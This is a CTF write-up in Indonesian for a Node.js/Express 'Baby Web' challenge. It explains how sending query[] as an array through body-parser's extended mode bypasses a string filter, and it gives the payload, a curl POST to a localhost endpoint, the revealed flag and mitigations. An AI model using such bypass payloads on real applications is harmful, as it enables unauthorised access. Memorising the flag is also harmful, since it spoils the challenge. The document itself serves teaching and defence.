# Write-up: Baby Web (Node.js Type Confusion)

## 1\. Analisis Kerentanan

Tantangan ini mengeksploitasi kerentanan **JavaScript Type Confusion** dalam aplikasi Node.js/Express. Kerentanan muncul dari asumsi tipe data yang salah pada *input* pengguna (`query`) dan cara Node.js memproses *payload* kompleks.

### Kode Bermasalah:

Aplikasi menggunakan metode validasi yang rentan:

```javascript
// Kunci Rahasia
const key = "randomBytes(16).toString('hex')"; 
// ...
// Filter dan Validasi
if (query.includes("String")) { 
    return res.send(htmlPage("❌ Access Denied: Suspicious pattern detected."));
}

if (query.includes(key)) { // Pengecekan krusial
    // ... Dapatkan Flag
}
```

### Mekanisme Eksploitasi:

1.  **Parsing yang Lemah:** Aplikasi menggunakan `body-parser` dengan opsi **`extended: true`**. Opsi ini memungkinkan *input* *form* seperti `query[]=...` di-parse sebagai tipe data **Array** di sisi server, bukan *String* tunggal.
2.  **Type Confusion:** Ketika `query` menjadi tipe **Array**, JavaScript secara otomatis memanggil **`Array.prototype.includes()`**.
      * **String.includes()** mencari *substring* (cocokkan sebagian).
      * **Array.includes()** mencari **elemen yang sama persis** (match sempurna).
3.  **Bypass dan Match:** Dengan mengirim *payload* sebagai *Array*, kita berhasil:
      * **Melewati Filter:** `query.includes("String")` akan bernilai *False* karena *array* tidak berisi *string* `"String"` sebagai *elemen* yang terpisah.
      * **Memenuhi Validasi:** `query.includes(key)` akan bernilai *True* karena kita menyertakan *string* kunci rahasia sebagai elemen tunggal di dalam *array*.

## 2\. Eksploitasi dan Payload Final

Tujuan serangan adalah memaksa variabel `query` menjadi *Array* yang hanya berisi *literal string* kunci rahasia.

### Payload *x-www-form-urlencoded*:

```
query[]=randomBytes(16).toString('hex')
```

### Eksekusi Serangan dengan `curl`

Eksploitasi dijalankan menggunakan `curl` untuk mengirim permintaan **POST** yang terformat dengan benar ke *endpoint* `/search`.

```bash
# Perintah yang digunakan di Terminal:
curl.exe -X POST -d "query[]=randomBytes(16).toString('hex')" http://localhost:10009/search
```

### Hasil dan Flag:

Server merespons dengan mengkonfirmasi keberhasilan *type confusion* dan menampilkan *flag* di dalam *response* HTML:

```
✅ Key matched: [ 'randomBytes(16).toString(\'hex\')' ]
🎉 Here is your flag: prelim{i_was_confused_ab_what_to_make--so_i_made_a_js_type_confusion_baby_challenge_ehhe}
```

**Flag:** `prelim{i_was_confused_ab_what_to_make--so_i_made_a_js_type_confusion_baby_challenge_ehhe}`

## 3\. Mitigasi (Pencegahan)

Kerentanan *Type Confusion* ini dapat dicegah dengan praktik keamanan *server-side* yang ketat:

1.  **Validasi Tipe Data Eksplisit:** Selalu periksa tipe data *input* pengguna sebelum memanggil *method* yang sensitif. *Developer* seharusnya secara eksplisit memeriksa apakah `query` adalah *string* sebelum memanggil `.includes()`.
    *Contoh perbaikan:* `if (typeof query !== 'string' || query.includes("String")) { ... }`

2.  **Konfigurasi `body-parser`:** Jika *server* tidak membutuhkan *parsing* *nested objects* atau *arrays*, atur `extended` ke `false`:

      * `app.use(bodyParser.urlencoded({ extended: false }));`
        Pengaturan ini memastikan *input* `query[]` akan diperlakukan sebagai *string* literal, bukan sebagai *array*, sehingga mencegah *type confusion*.
## Bukti 
<img width="1920" height="1080" alt="Screenshot 2025-09-24 220048" src="https://github.com/user-attachments/assets/efc22ff9-cace-427f-ac14-ceca0fd53e94" />

<img width="1920" height="1080" alt="Screenshot 2025-09-24 220216" src="https://github.com/user-attachments/assets/6510298c-8f66-4671-b33c-e138d165b2d1" />
